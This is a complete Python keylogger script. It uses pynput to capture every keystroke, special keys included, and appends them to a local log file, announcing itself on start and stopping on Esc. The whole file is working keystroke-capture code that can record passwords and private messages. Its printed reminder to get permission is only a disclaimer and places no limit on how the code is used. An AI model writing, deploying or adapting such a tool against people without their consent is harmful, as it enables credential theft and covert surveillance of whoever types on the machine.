import os
from pynput import keyboard

# Determine the log file path based on the operating system
if os.name == 'nt':  # Windows
    log_file = "C:\\path\\to\\your\\directory\\key_log.txt"
else:  # macOS or Linux
    log_file = "Keyloggers.pages"

# Function to write keystrokes to the log file
def on_press(key):
    try:
        with open(log_file, "a") as file:
            # Record regular key presses
            file.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as file:
            # Handle special keys (e.g., space, enter, etc.)
            if key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            else:
                file.write(f" [{key}] ")

# Function to stop the keylogger when the 'esc' key is pressed (optional)
def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

# Main function to start the keylogger
def start_keylogger():
    print("Keylogger started. Press 'esc' to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Ensure proper usage and permissions
if __name__ == "__main__":
    print("Ethical Considerations: Ensure you have explicit permission to use this keylogger.")
    start_keylogger()